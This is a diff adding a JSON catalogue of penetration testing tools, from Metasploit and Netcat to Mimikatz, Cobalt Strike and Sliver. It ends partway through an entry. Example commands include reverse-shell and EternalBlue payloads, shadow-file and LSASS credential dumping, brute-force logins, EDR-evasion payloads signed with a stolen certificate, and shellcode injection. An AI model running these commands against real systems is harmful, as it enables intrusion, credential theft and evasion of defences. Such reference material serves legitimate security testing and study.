@@ -1,0 +1,2057 @@
+
+## Penetration Testing Tools Corpus
+
+```json
+[
+  {
+    "name": "Metasploit Framework",
+    "description": "Metasploit is an open-source penetration testing framework with a vast library of exploits, payloads, and post-exploitation modules to simulate real-world attacks and validate vulnerabilities. It supports network, web, and database exploitation.",
+    "usage": "Used for identifying and exploiting vulnerabilities in systems, networks, and applications. Automates attack simulations, tests defenses, and generates reports.",
+    "key_features": [
+      "Over 4,000 exploit modules",
+      "Payload generation (reverse shells, Meterpreter)",
+      "Post-exploitation for privilege escalation",
+      "Integration with Nmap, Nessus",
+      "Antivirus evasion and phishing wizards"
+    ],
+    "example_commands": [
+      "msfconsole",
+      "use exploit/windows/smb/ms17_010_eternalblue",
+      "set RHOSTS 192.168.1.100",
+      "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+      "exploit",
+      "db_nmap -sV 192.168.1.0/24"
+    ],
+    "source": "https://www.metasploit.com"
+  },
+  {
+    "name": "Netcat",
+    "description": "Netcat is a versatile networking utility for reading and writing data across TCP or UDP connections. Known as the 'Swiss Army knife' of networking, it supports port scanning, banner grabbing, and shell creation.",
+    "usage": "Used for network reconnaissance, establishing backdoors, and transferring data during penetration testing.",
+    "key_features": [
+      "Supports TCP and UDP",
+      "Banner grabbing",
+      "Bind and reverse shell creation",
+      "File transfer",
+      "Port scanning"
+    ],
+    "example_commands": [
+      "nc -nv 192.168.1.100 80",
+      "nc -nvlp 4444 -e /bin/bash",
+      "nc -nv 192.168.1.100 4444 -e /bin/bash",
+      "nc -zv 192.168.1.100 1-1000",
+      "echo 'GET / HTTP/1.0' | nc 192.168.1.100 80"
+    ],
+    "source": "https://nc110.sourceforge.io/"
+  },
+  {
+    "name": "John the Ripper",
+    "description": "John the Ripper is a fast password cracker for auditing weak passwords using dictionary, brute-force, and hybrid attacks, supporting multiple hash types.",
+    "usage": "Used to crack password hashes from Windows SAM or Unix /etc/shadow files to assess credential security.",
+    "key_features": [
+      "Supports MD5, SHA, NTLM",
+      "Dictionary and brute-force modes",
+      "GPU support in pro version",
+      "Customizable wordlists",
+      "Cross-platform"
+    ],
+    "example_commands": [
+      "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+      "john --format=nt hash.txt",
+      "john --incremental hash.txt",
+      "john --show hash.txt",
+      "unshadow /etc/passwd /etc/shadow > hash.txt"
+    ],
+    "source": "https://www.openwall.com/john/"
+  },
+  {
+    "name": "Social-Engineer Toolkit (SET)",
+    "description": "SET is a Python-based framework for simulating social engineering attacks like phishing and credential harvesting, integrating with Metasploit.",
+    "usage": "Used to test human vulnerabilities through phishing emails, malicious websites, or USB-based attacks.",
+    "key_features": [
+      "Spear phishing and mass mailer",
+      "Website cloning",
+      "Java applet and browser exploits",
+      "Infectious media generation",
+      "Metasploit integration"
+    ],
+    "example_commands": [
+      "setoolkit",
+      "1",
+      "2",
+      "3",
+      "2",
+      "set:webattack> SET WEBATTACK_IP 192.168.1.100"
+    ],
+    "source": "https://github.com/trustedsec/social-engineer-toolkit"
+  },
+  {
+    "name": "Nmap",
+    "description": "Nmap is an open-source tool for network discovery and security auditing, used to scan networks, identify hosts, and enumerate services.",
+    "usage": "Used for network reconnaissance to map topology, detect vulnerabilities, and integrate with tools like Metasploit.",
+    "key_features": [
+      "Port scanning (TCP, UDP, SYN)",
+      "OS and service detection",
+      "Nmap Scripting Engine (NSE)",
+      "Firewall evasion",
+      "Cross-platform"
+    ],
+    "example_commands": [
+      "nmap -sS 192.168.1.0/24",
+      "nmap -sV -p 1-65535 192.168.1.100",
+      "nmap --script vuln 192.168.1.100",
+      "nmap -T4 -A 192.168.1.100",
+      "nmap -oX output.xml 192.168.1.0/24"
+    ],
+    "source": "https://nmap.org/"
+  },
+  {
+    "name": "Burp Suite",
+    "description": "Burp Suite is a platform for web application security testing, offering tools for intercepting and manipulating HTTP/S traffic.",
+    "usage": "Used to identify and exploit web vulnerabilities like SQL injection and XSS through manual and automated testing.",
+    "key_features": [
+      "Proxy for HTTP/S traffic",
+      "Scanner (Pro version)",
+      "Intruder for brute-forcing",
+      "Repeater for request manipulation",
+      "Spider and Crawler"
+    ],
+    "example_commands": [
+      "Configure browser proxy to 127.0.0.1:8080",
+      "Use Intruder to brute-force login with payload: admin:password123",
+      "Use Repeater to modify HTTP request",
+      "Run Scanner on target URL (Pro)",
+      "Export findings to XML"
+    ],
+    "source": "https://portswigger.net/burp"
+  },
+  {
+    "name": "Wireshark",
+    "description": "Wireshark is a network protocol analyzer for capturing and inspecting network traffic in real-time.",
+    "usage": "Used for network reconnaissance and analysis to identify protocols, capture credentials, or detect anomalies.",
+    "key_features": [
+      "Real-time packet capture",
+      "Supports multiple protocols",
+      "Filtering and search",
+      "Tshark CLI",
+      "Cross-platform"
+    ],
+    "example_commands": [
+      "wireshark &",
+      "tshark -i eth0 -f 'tcp port 80'",
+      "tshark -r capture.pcap -Y 'http.request'",
+      "wireshark -r capture.pcap",
+      "tshark -i eth0 -c 100"
+    ],
+    "source": "https://www.wireshark.org/"
+  },
+  {
+    "name": "Hydra",
+    "description": "Hydra is a password cracking tool for brute-forcing network services like SSH, FTP, and HTTP.",
+    "usage": "Used to test login credential strength by attempting multiple username-password combinations.",
+    "key_features": [
+      "Supports multiple protocols",
+      "Parallelized attacks",
+      "Customizable wordlists",
+      "Cross-platform",
+      "Automation integration"
+    ],
+    "example_commands": [
+      "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh",
+      "hydra -L users.txt -P passwords.txt 192.168.1.100 ftp",
+      "hydra -l admin -p password123 192.168.1.100 http-post-form '/login:username=^USER^&password=^PASS^:Invalid'",
+      "hydra -t 4 192.168.1.100 smb",
+      "hydra -l user -P passlist.txt 192.168.1.100 rdp"
+    ],
+    "source": "https://github.com/vanhauser-thc/thc-hydra"
+  },
+  {
+    "name": "Hashcat",
+    "description": "Hashcat is a high-performance password cracking tool using GPU acceleration for dictionary, brute-force, and hybrid attacks.",
+    "usage": "Used to recover passwords from hashes obtained during penetration testing.",
+    "key_features": [
+      "Supports over 300 hash types",
+      "GPU-accelerated",
+      "Multiple attack modes",
+      "Customizable rules",
+      "Cross-platform"
+    ],
+    "example_commands": [
+      "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
+      "hashcat -m 1000 -a 3 hash.txt ?d?d?d?d",
+      "hashcat -m 1800 -a 0 hash.txt custom.txt --rules rules/best64.rule",
+      "hashcat --show hash.txt",
+      "hashcat -m 500 -a 0 hash.txt dict1.txt dict2.txt"
+    ],
+    "source": "https://hashcat.net/hashcat/"
+  },
+  {
+    "name": "Aircrack-ng",
+    "description": "Aircrack-ng is a suite of tools for auditing and cracking wireless networks, focusing on WEP and WPA/WPA2.",
+    "usage": "Used to capture packets, crack encryption keys, and assess Wi-Fi security.",
+    "key_features": [
+      "Packet capture and injection",
+      "Cracks WEP and WPA/WPA2-PSK",
+      "Multiple wireless interfaces",
+      "Tools like Airodump-ng",
+      "Cross-platform"
+    ],
+    "example_commands": [
+      "airodump-ng wlan0",
+      "airodump-ng --bssid 00:14:22:01:23:45 --channel 6 wlan0",
+      "aireplay-ng --deauth 10 -a 00:14:22:01:23:45 wlan0",
+      "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap",
+      "airdecap-ng -e 'SSID' -p passphrase capture.cap"
+    ],
+    "source": "https://www.aircrack-ng.org/"
+  },
+  {
+    "name": "SQLMap",
+    "description": "SQLMap automates the detection and exploitation of SQL injection vulnerabilities in web applications.",
+    "usage": "Used to identify SQL injection flaws, extract database information, and bypass authentication.",
+    "key_features": [
+      "Supports multiple DBMS",
+      "Automated detection",
+      "Data extraction",
+      "WAF bypass",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "sqlmap -u 'http://192.168.1.100/login.php' --forms",
+      "sqlmap -u 'http://192.168.1.100?id=1' --dbs",
+      "sqlmap -u 'http://192.168.1.100?id=1' -D testdb -T users --dump",
+      "sqlmap -u 'http://192.168.1.100?id=1' --os-shell",
+      "sqlmap -r request.txt --level 5"
+    ],
+    "source": "https://sqlmap.org/"
+  },
+  {
+    "name": "Nikto",
+    "description": "Nikto is an open-source web server scanner that identifies vulnerabilities, misconfigurations, and outdated software.",
+    "usage": "Used for web server reconnaissance to detect insecure files and server issues.",
+    "key_features": [
+      "Scans over 6,700 dangerous files",
+      "Checks outdated software",
+      "Identifies misconfigurations",
+      "Supports SSL",
+      "Multiple output formats"
+    ],
+    "example_commands": [
+      "nikto -h http://192.168.1.100",
+      "nikto -h https://example.com -ssl",
+      "nikto -h 192.168.1.100 -p 80,443",
+      "nikto -h 192.168.1.100 -o report.html",
+      "nikto -h 192.168.1.100 -Tuning 123"
+    ],
+    "source": "https://cirt.net/Nikto2"
+  },
+  {
+    "name": "Kismet",
+    "description": "Kismet is a wireless network detector and sniffer for monitoring Wi-Fi, Bluetooth, and other protocols.",
+    "usage": "Used for wireless reconnaissance to identify access points and detect hidden networks.",
+    "key_features": [
+      "Detects Wi-Fi, Bluetooth, Zigbee",
+      "Packet capture",
+      "Hidden SSID detection",
+      "Multiple interfaces",
+      "Web-based interface"
+    ],
+    "example_commands": [
+      "kismet -c wlan0",
+      "kismet --no-ncurses",
+      "kismet -c wlan0 --out kismet_log",
+      "kismet -c wlan0 --ssid-filter 'MySSID'",
+      "kismet --httpd 2501"
+    ],
+    "source": "https://www.kismetwireless.net/"
+  },
+  {
+    "name": "Wifite",
+    "description": "Wifite automates auditing and cracking of WEP, WPA, and WPS-enabled wireless networks.",
+    "usage": "Used to streamline wireless penetration testing with automated attacks.",
+    "key_features": [
+      "Automates WEP, WPA, WPS attacks",
+      "Integrates Aircrack-ng, Reaver",
+      "Multiple adapters",
+      "Automated deauthentication",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "wifite --all",
+      "wifite -i wlan0 --wpa",
+      "wifite -i wlan0 --wps",
+      "wifite --dict /usr/share/wordlists/rockyou.txt",
+      "wifite --mac"
+    ],
+    "source": "https://github.com/derv82/wifite2"
+  },
+  {
+    "name": "BeEF",
+    "description": "BeEF (Browser Exploitation Framework) exploits web browser vulnerabilities to assess client-side security.",
+    "usage": "Used to simulate client-side attacks like XSS to test browser vulnerabilities.",
+    "key_features": [
+      "Exploits browser vulnerabilities",
+      "Social engineering support",
+      "Hooks browsers",
+      "Metasploit integration",
+      "Web-based interface"
+    ],
+    "example_commands": [
+      "beef-xss",
+      "Configure hook.js on malicious webpage",
+      "Execute JavaScript via BeEF UI",
+      "Link BeEF with Metasploit",
+      "Generate hook: http://192.168.1.100:3000/hook.js"
+    ],
+    "source": "https://beefproject.com/"
+  },
+  {
+    "name": "ZAP (Zed Attack Proxy)",
+    "description": "OWASP ZAP is an open-source web application security scanner for identifying XSS, SQL injection, and other vulnerabilities.",
+    "usage": "Used for automated and manual testing of web applications.",
+    "key_features": [
+      "Automated scanning",
+      "Proxy for HTTP/S",
+      "Active and passive modes",
+      "Scripting support",
+      "Cross-platform"
+    ],
+    "example_commands": [
+      "zap.sh",
+      "zap-cli quick-scan http://192.168.1.100",
+      "zap-cli spider http://example.com",
+      "zap-cli active-scan http://example.com",
+      "zap-cli report -o report.html"
+    ],
+    "source": "https://www.zaproxy.org/"
+  },
+  {
+    "name": "Nessus",
+    "description": "Nessus is a commercial vulnerability scanner for identifying security issues in networks and applications.",
+    "usage": "Used for automated vulnerability scanning and compliance checks.",
+    "key_features": [
+      "Scans over 120,000 vulnerabilities",
+      "Compliance auditing",
+      "Network and web scanning",
+      "Customizable policies",
+      "Metasploit integration"
+    ],
+    "example_commands": [
+      "Access https://localhost:8834",
+      "Create PCI DSS scan policy",
+      "Scan 192.168.1.0/24",
+      "Export to CSV",
+      "Import to Metasploit: import nessus_xml"
+    ],
+    "source": "https://www.tenable.com/products/nessus"
+  },
+  {
+    "name": "OpenVAS",
+    "description": "OpenVAS is an open-source vulnerability scanner for networks and systems.",
+    "usage": "Used for automated scanning to detect vulnerabilities and misconfigurations.",
+    "key_features": [
+      "Scans thousands of vulnerabilities",
+      "Network and host scanning",
+      "Customizable configurations",
+      "Web interface (Greenbone)",
+      "Updated vulnerability database"
+    ],
+    "example_commands": [
+      "openvas-start",
+      "omp -u admin -w password --xml '<create_target><name>Target</name><hosts>192.168.1.0/24</hosts></create_target>'",
+      "omp -u admin -w password -T",
+      "omp -u admin -w password -S <task_id>",
+      "omp -u admin -w password -R <task_id>"
+    ],
+    "source": "https://www.openvas.org/"
+  },
+  {
+    "name": "Cain & Abel",
+    "description": "Cain & Abel is a Windows-based tool for password recovery and network sniffing.",
+    "usage": "Used for password cracking, sniffing, and analyzing VoIP/wireless protocols.",
+    "key_features": [
+      "Password cracking",
+      "Packet sniffing",
+      "Wireless and VoIP support",
+      "Brute-force attacks",
+      "GUI interface"
+    ],
+    "example_commands": [
+      "Launch Cain & Abel GUI",
+      "Sniff eth0 traffic",
+      "Crack LM hashes",
+      "Analyze VoIP credentials",
+      "Recover passwords"
+    ],
+    "source": "http://www.oxid.it/cain.html"
+  },
+  {
+    "name": "Maltego",
+    "description": "Maltego is an OSINT and graphical link analysis tool for mapping data relationships.",
+    "usage": "Used for reconnaissance to map people, organizations, and domains.",
+    "key_features": [
+      "Graphical visualization",
+      "OSINT collection",
+      "Customizable transforms",
+      "External database integration",
+      "Cross-platform"
+    ],
+    "example_commands": [
+      "Launch Maltego GUI",
+      "Transform: Domain to IP on example.com",
+      "Map emails to domains",
+      "Export to CSV",
+      "Run OSINT transform"
+    ],
+    "source": "https://www.maltego.com/"
+  },
+  {
+    "name": "Recon-ng",
+    "description": "Recon-ng is a reconnaissance framework for OSINT using modular scripts.",
+    "usage": "Used for automated OSINT to identify domains, subdomains, and contacts.",
+    "key_features": [
+      "Modular framework",
+      "OSINT from Shodan, WHOIS",
+      "Subdomain enumeration",
+      "Data storage",
+      "CLI with workspaces"
+    ],
+    "example_commands": [
+      "recon-ng",
+      "workspaces create pentest",
+      "use recon/domains-hosts/shodan_hostname",
+      "set SOURCE example.com",
+      "run",
+      "show hosts"
+    ],
+    "source": "https://github.com/lanmaster53/recon-ng"
+  },
+  {
+    "name": "Mimikatz",
+    "description": "Mimikatz is a post-exploitation tool for extracting credentials and Kerberos tickets from Windows systems.",
+    "usage": "Used to harvest credentials and escalate privileges in Windows environments.",
+    "key_features": [
+      "Extracts passwords, NTLM hashes",
+      "Pass-the-hash/ticket",
+      "Kerberos ticket manipulation",
+      "Dumps LSASS memory",
+      "Metasploit integration"
+    ],
+    "example_commands": [
+      "mimikatz",
+      "sekurlsa::logonpasswords",
+      "sekurlsa::msv",
+      "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123 /krbtgt:abc123",
+      "sekurlsa::pth /user:admin /domain:example.com /ntlm:abc123"
+    ],
+    "source": "https://github.com/gentilkiwi/mimikatz"
+  },
+  {
+    "name": "Responder",
+    "description": "Responder exploits LLMNR, NBT-NS, and mDNS poisoning to capture credentials in Windows environments.",
+    "usage": "Used to intercept authentication requests and harvest credentials.",
+    "key_features": [
+      "Poisons LLMNR, NBT-NS, mDNS",
+      "Captures NTLM hashes",
+      "Supports HTTP/SMB/MSSQL/FTP",
+      "Traffic analysis",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "responder -I eth0",
+      "responder -I eth0 -w",
+      "responder -I eth0 -A",
+      "responder -I eth0 -b",
+      "cat Responder-Session.log"
+    ],
+    "source": "https://github.com/lgandx/Responder"
+  },
+  {
+    "name": "DirBuster",
+    "description": "DirBuster brute-forces directories and files on web servers to identify hidden content.",
+    "usage": "Used for web reconnaissance to discover hidden directories or files.",
+    "key_features": [
+      "Brute-forces directories/files",
+      "Customizable wordlists",
+      "Multi-threaded",
+      "GUI and CLI",
+      "Proxy integration"
+    ],
+    "example_commands": [
+      "dirbuster",
+      "dirb http://192.168.1.100 /usr/share/wordlists/dirb/common.txt",
+      "dirb http://192.168.1.100 -X .php",
+      "dirb http://192.168.1.100 -o results.txt",
+      "dirb http://192.168.1.100 -z 100"
+    ],
+    "source": "https://www.kali.org/tools/dirbuster/"
+  },
+  {
+    "name": "W3AF",
+    "description": "W3AF is an open-source tool for auditing and exploiting web application vulnerabilities like XSS and SQL injection.",
+    "usage": "Used to identify and exploit web vulnerabilities during penetration testing.",
+    "key_features": [
+      "Automated scanning",
+      "Multiple attack plugins",
+      "Web crawling",
+      "Customizable profiles",
+      "GUI and CLI"
+    ],
+    "example_commands": [
+      "w3af",
+      "w3af_console",
+      "plugins audit xss, sqlmap",
+      "target set http://192.168.1.100",
+      "start",
+      "exploit"
+    ],
+    "source": "https://github.com/andresriancho/w3af"
+  },
+  {
+    "name": "CeWL",
+    "description": "CeWL generates custom wordlists by crawling websites to extract unique words.",
+    "usage": "Used to create targeted wordlists for password cracking or brute-forcing.",
+    "key_features": [
+      "Website crawling",
+      "Customizable depth",
+      "Proxy and authentication",
+      "Integrates with crackers",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "cewl http://example.com -w wordlist.txt",
+      "cewl http://example.com -d 2 -m 6",
+      "cewl http://example.com --proxy 127.0.0.1:8080",
+      "cewl http://example.com --auth_type basic --auth_user user --auth_pass pass",
+      "cewl http://example.com -e -w emails.txt"
+    ],
+    "source": "https://github.com/digininja/CeWL"
+  },
+  {
+    "name": "Medusa",
+    "description": "Medusa is a modular password cracking tool for brute-forcing credentials across network services.",
+    "usage": "Used to test credential strength for services like SSH and HTTP.",
+    "key_features": [
+      "Supports multiple protocols",
+      "Parallelized attacks",
+      "Modular design",
+      "Customizable wordlists",
+      "Cross-platform"
+    ],
+    "example_commands": [
+      "medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh",
+      "medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp",
+      "medusa -h 192.168.1.100 -u admin -p password123 -M http",
+      "medusa -h 192.168.1.100 -t 4 -M smb",
+      "medusa -h 192.168.1.100 -M rdp -u user -P passlist.txt"
+    ],
+    "source": "http://www.foofus.net/goons/jmk/medusa/medusa.html"
+  },
+  {
+    "name": "Patator",
+    "description": "Patator is a multi-purpose brute-forcing tool for credentials and parameters across services.",
+    "usage": "Used for brute-forcing passwords and enumerating parameters in network services.",
+    "key_features": [
+      "Supports multiple modules",
+      "Customizable payloads",
+      "Multi-threaded",
+      "Flexible I/O",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=/usr/share/wordlists/rockyou.txt",
+      "patator http_fuzz url=http://192.168.1.100/login user=admin password=FILE0 0=passwords.txt",
+      "patator ftp_login host=192.168.1.100 user=FILE0 0=users.txt password=FILE1 1=pass.txt",
+      "patator sql_login host=192.168.1.100 user=sa password=FILE0 0=pass.txt",
+      "patator http_fuzz url=http://192.168.1.100 id=FILE0 0=1-100"
+    ],
+    "source": "https://github.com/lanjelot/patator"
+  },
+  {
+    "name": "FuzzDB",
+    "description": "FuzzDB is a collection of attack patterns and wordlists for fuzzing web applications and services.",
+    "usage": "Used to provide payloads for fuzzing to identify vulnerabilities like XSS.",
+    "key_features": [
+      "Payloads for XSS, SQL injection",
+      "Wordlists for directories",
+      "API fuzzing patterns",
+      "Integrates with Burp, DirBuster",
+      "Customizable"
+    ],
+    "example_commands": [
+      "Use /fuzzdb/attack/xss/xss-rsnake.txt with Burp Intruder",
+      "dirb http://192.168.1.100 /fuzzdb/discovery/predictable-filepaths/filenames.txt",
+      "hydra -L /fuzzdb/wordlists-user-passwd/names/namelist.txt -P /fuzzdb/wordlists-user-passwd/passwds/passwords.txt 192.168.1.100 ssh",
+      "sqlmap -u http://192.168.1.100 --data 'id=1' --payloads /fuzzdb/attack/sql-injection/sqlmap.txt",
+      "cat /fuzzdb/attack/http-protocol/http-protocol.txt"
+    ],
+    "source": "https://github.com/fuzzdb-project/fuzzdb"
+  },
+  {
+    "name": "Impacket",
+    "description": "Impacket is a collection of Python scripts for interacting with network protocols, especially Windows-based attacks.",
+    "usage": "Used for post-exploitation tasks like SMB relay and credential dumping.",
+    "key_features": [
+      "Supports SMB, Kerberos, NTLM",
+      "Pass-the-hash",
+      "SMB relay",
+      "Lateral movement",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "psexec.py domain/user:password@192.168.1.100",
+      "smbrelayx.py -h 192.168.1.100",
+      "getTGT.py domain/user:password",
+      "wmiexec.py domain/user:password@192.168.1.100",
+      "secretsdump.py domain/user:password@192.168.1.100"
+    ],
+    "source": "https://github.com/SecureAuthCorp/impacket"
+  },
+  {
+    "name": "PowerSploit",
+    "description": "PowerSploit is a collection of PowerShell scripts for post-exploitation in Windows environments.",
+    "usage": "Used for privilege escalation, credential dumping, and persistence.",
+    "key_features": [
+      "PowerShell-based",
+      "Credential harvesting",
+      "Persistence mechanisms",
+      "Reconnaissance",
+      "Metasploit integration"
+    ],
+    "example_commands": [
+      "Import-Module ViewPower.ps1",
+      "Get-NetUser",
+      "Invoke-Mimikatz",
+      "Get-NetComputer",
+      "Invoke-Portscan -Hosts 192.168.1.0/24"
+    ],
+    "source": "https://github.com/PowerShellMafia/PowerSploit"
+  },
+  {
+    "name": "The Harvester",
+    "description": "The Harvester is an OSINT tool for gathering emails, subdomains, hosts, and other publicly available data.",
+    "usage": "Used for reconnaissance to collect data for social engineering or network attacks.",
+    "key_features": [
+      "Collects from Google, Bing, Shodan",
+      "Enumerates emails, subdomains",
+      "Multiple data sources",
+      "Export formats",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "theharvester -d example.com -b google",
+      "theharvester -d example.com -b all",
+      "theharvester -d example.com -l 500 -b bing",
+      "theharvester -d example.com -f report.html",
+      "theharvester -d example.com -b shodan"
+    ],
+    "source": "https://github.com/laramies/theHarvester"
+  },
+  {
+    "name": "ScareCrow",
+    "description": "ScareCrow creates payloads to bypass EDR systems by generating stealthy, encrypted payloads.",
+    "usage": "Used in red teaming to deliver payloads that evade detection.",
+    "key_features": [
+      "Encrypted, polymorphic payloads",
+      "EDR bypass (unhooking, ETW)",
+      "Mimics legitimate processes",
+      "Customizable delivery",
+      "Cobalt Strike integration"
+    ],
+    "example_commands": [
+      "ScareCrow -I /path/to/payload.exe -Loader binary -domain example.com",
+      "ScareCrow -I shellcode.bin -Loader dll -o output.dll",
+      "ScareCrow -I payload.exe -Obfu",
+      "ScareCrow -I cobaltstrike.bin -Loader control -o malicious.xll",
+      "ScareCrow -I payload.exe -sign -cert stolen_cert.pfx"
+    ],
+    "source": "https://github.com/optiv/ScareCrow"
+  },
+  {
+    "name": "Empire",
+    "description": "Empire is a post-exploitation framework using PowerShell and Python for managing compromised systems.",
+    "usage": "Used for privilege escalation, lateral movement, and persistence.",
+    "key_features": [
+      "PowerShell/Python agents",
+      "Modular architecture",
+      "Encrypted communications",
+      "Persistence",
+      "Cross-platform"
+    ],
+    "example_commands": [
+      "empire",
+      "listeners; set Name http; execute",
+      "usestager multi/launcher",
+      "set Listener http; execute",
+      "agents; interact <agent_name>",
+      "usemodule powershell/credentials/mimikatz"
+    ],
+    "source": "https://github.com/BC-Security/Empire"
+  },
+  {
+    "name": "Cobalt Strike",
+    "description": "Cobalt Strike is a commercial tool for adversary emulation with beacon payloads for command and control.",
+    "usage": "Used in red teaming to simulate APTs, including phishing and lateral movement.",
+    "key_features": [
+      "Beacon payloads",
+      "Phishing support",
+      "Lateral movement",
+      "Malleable C2 profiles",
+      "Metasploit integration"
+    ],
+    "example_commands": [
+      "teamserver <ip> <password>",
+      "beacon> spawn x64",
+      "beacon> shell whoami",
+      "beacon> upload /path/to/malware.exe",
+      "beacon> mimikatz",
+      "beacon> shinject <pid> /path/to/shellcode.bin"
+    ],
+    "source": "https://www.cobaltstrike.com/"
+  },
+  {
+    "name": "Vega",
+    "description": "Vega is an open-source web vulnerability scanner for identifying XSS, SQL injection, and other issues.",
+    "usage": "Used to scan web applications for vulnerabilities.",
+    "key_features": [
+      "Automated scanning",
+      "Proxy for HTTP",
+      "Plugin extensible",
+      "GUI interface",
+      "Authenticated scans"
+    ],
+    "example_commands": [
+      "vega",
+      "Configure scan: http://192.168.1.100",
+      "Enable XSS, SQL modules",
+      "Start scan",
+      "Export to HTML"
+    ],
+    "source": "https://subgraph.com/vega/"
+  },
+  {
+    "name": "Wapiti",
+    "description": "Wapiti is a command-line tool for auditing web applications, identifying XSS, SQL injection, and file disclosure.",
+    "usage": "Used for black-box scanning of web applications.",
+    "key_features": [
+      "Scans common vulnerabilities",
+      "Supports GET/POST",
+      "Customizable modules",
+      "Detailed reports",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "wapiti -u http://192.168.1.100",
+      "wapiti -u http://example.com --module xss,sql",
+      "wapiti -u http://192.168.1.100 -o report.html",
+      "wapiti -u http://192.168.1.100 --auth-method basic --auth-cred user:pass",
+      "wapiti -u http://192.168.1.100 --scope domain"
+    ],
+    "source": "https://wapiti-scanner.github.io/"
+  },
+  {
+    "name": "Pompem",
+    "description": "Pompem automates searching for exploits in databases like Exploit-DB and Packetstorm.",
+    "usage": "Used to identify known exploits for software vulnerabilities.",
+    "key_features": [
+      "Searches Exploit-DB, Packetstorm",
+      "Automates exploit discovery",
+      "CLI interface",
+      "Advanced queries",
+      "Workflow integration"
+    ],
+    "example_commands": [
+      "pompem -s apache",
+      "pompem -s wordpress --type exploit",
+      "pompem -s cve-2021-41773",
+      "pompem -s windows --file results.txt",
+      "pompem -s mysql --source exploitdb"
+    ],
+    "source": "https://github.com/rfunix/Pompem"
+  },
+  {
+    "name": "Amass",
+    "description": "Amass is an OWASP tool for network mapping and attack surface discovery, specializing in subdomain enumeration.",
+    "usage": "Used for reconnaissance to enumerate subdomains and map attack surfaces.",
+    "key_features": [
+      "Active/passive enumeration",
+      "DNS and certificate analysis",
+      "Shodan, Censys integration",
+      "Graph visualization",
+      "Local logging"
+    ],
+    "example_commands": [
+      "amass enum -d example.com -o subdomains.txt",
+      "amass enum -d example.com -brute -o subdomains.txt",
+      "amass enum -d example.com -passive",
+      "amass track -d example.com -last output.txt"
+    ],
+    "source": "https://github.com/OWASP/Amass"
+  },
+  {
+    "name": "Dradis",
+    "description": "Dradis is a collaboration and reporting platform for consolidating findings and generating reports.",
+    "usage": "Used to aggregate results from Nmap, Nessus, and Burp Suite for reporting.",
+    "key_features": [
+      "Centralized management",
+      "Tool integration",
+      "Customizable templates",
+      "Team collaboration",
+      "Local storage"
+    ],
+    "example_commands": [
+      "dradis-ce",
+      "Import Nmap XML via web interface",
+      "Export to HTML/PDF",
+      "Add manual finding in UI",
+      "Assign task to team"
+    ],
+    "source": "https://dradisframework.org/"
+  },
+  {
+    "name": "CrackMapExec",
+    "description": "CrackMapExec automates security assessments in Active Directory environments for credential harvesting and lateral movement.",
+    "usage": "Used for post-exploitation to enumerate AD and execute commands.",
+    "key_features": [
+      "Enumerates AD users, groups",
+      "Pass-the-hash",
+      "Dumps SAM, LSA, NTDS",
+      "Multi-host execution",
+      "Local logging"
+    ],
+    "example_commands": [
+      "crackmapexec smb 192.168.1.0/24 -u admin -p password",
+      "crackmapexec smb 192.168.1.100 -u admin -H ntlm_hash",
+      "crackmapexec winrm 192.168.1.100 -u admin -p password -x whoami",
+      "crackmapexec smb 192.168.1.0/24 --sam",
+      "crackmapexec ldap 192.168.1.100 -u admin -p password --bloodhound"
+    ],
+    "source": "https://github.com/byt3bl33d3r/CrackMapExec"
+  },
+  {
+    "name": "BloodHound",
+    "description": "BloodHound analyzes Active Directory environments to visualize attack paths and identify privilege escalation.",
+    "usage": "Used to map AD relationships and plan attacks like Kerberos exploits.",
+    "key_features": [
+      "Visualizes attack paths",
+      "Identifies misconfigurations",
+      "SharpHound data collection",
+      "Cypher queries",
+      "Local storage"
+    ],
+    "example_commands": [
+      "bloodhound",
+      "Run SharpHound: SharpHound.exe -c All",
+      "Import SharpHound JSON",
+      "Query shortest path to Domain Admins",
+      "Export graph as PNG"
+    ],
+    "source": "https://github.com/BloodHoundAD/BloodHound"
+  },
+  {
+    "name": "Sliver",
+    "description": "Sliver is a cross-platform C2 framework for red teaming, generating implants for post-exploitation.",
+    "usage": "Used to manage compromised hosts and maintain persistence.",
+    "key_features": [
+      "Cross-platform implants",
+      "Encrypted C2 (mTLS, HTTP/S)",
+      "Shellcode payloads",
+      "Obfuscation",
+      "Local logging"
+    ],
+    "example_commands": [
+      "sliver-server",
+      "generate --mtls 192.168.1.100:8888 --os windows --arch amd64",
+      "sessions",
+      "use <session_id>; whoami",
+      "generate-beacon --http 192.168.1.100 --save beacon.exe"
+    ],
+    "source": "https://github.com/BishopFox/sliver"
+  },
+  {
+    "name": "Gobuster",
+    "description": "Gobuster is a fast tool for brute-forcing directories, files, and DNS subdomains on web servers.",
+    "usage": "Used to discover hidden directories, files, or subdomains.",
+    "key_features": [
+      "Brute-forces directories, DNS",
+      "Multi-threaded",
+      "Customizable wordlists",
+      "CLI interface",
+      "Local output"
+    ],
+    "example_commands": [
+      "gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt",
+      "gobuster dir -u http://192.168.1.100 -w common.txt -x php,html",
+      "gobuster dns -d example.com -w subdomains.txt",
+      "gobuster dir -u http://192.168.1.100 -w common.txt -o results.txt",
+      "gobuster dir -u http://192.168.1.100 -w common.txt -t 50"
+    ],
+    "source": "https://github.com/OJ/gobuster"
+  },
+  {
+    "name": "Evil-WinRM",
+    "description": "Evil-WinRM interacts with Windows Remote Management for post-exploitation tasks.",
+    "usage": "Used for shell access, command execution, and file transfer via WinRM.",
+    "key_features": [
+      "WinRM shell access",
+      "File uploads/downloads",
+      "PowerShell execution",
+      "Pass-the-hash",
+      "Local logging"
+    ],
+    "example_commands": [
+      "evil-winrm -i 192.168.1.100 -u admin -p password",
